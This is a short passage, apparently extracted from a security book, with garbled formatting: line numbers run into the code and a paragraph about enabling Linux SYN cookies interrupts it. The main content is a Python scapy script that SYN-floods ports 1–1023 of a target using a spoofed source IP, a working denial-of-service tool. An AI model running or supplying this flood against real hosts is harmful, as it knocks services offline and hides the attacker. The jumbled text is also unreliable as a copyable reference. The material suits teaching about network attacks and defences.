1 #!/usr/bin/python 
Luckily nowadaysSYN ﬂoodingattacks are not such a big deal anymoreas they were a decade ago. On Linux you can activate SYN cookies by executingthe following:
echo 1 > /proc/sys/net/ipv4/tcp_syncookies


2 3 import sys 4 from scapy.all import srflood, IP, TCP 5 6 if len(sys.argv) < 3: 7 print sys.argv[0] + " <spoofed_source_ip> <target>" 8 sys.exit(0) 9 10 packet = IP(src=sys.argv[1], dst=sys.argv[2]) / \ 11 TCP(dport=range(1,1024), flags="S") 12 13 srflood(packet, store=0) 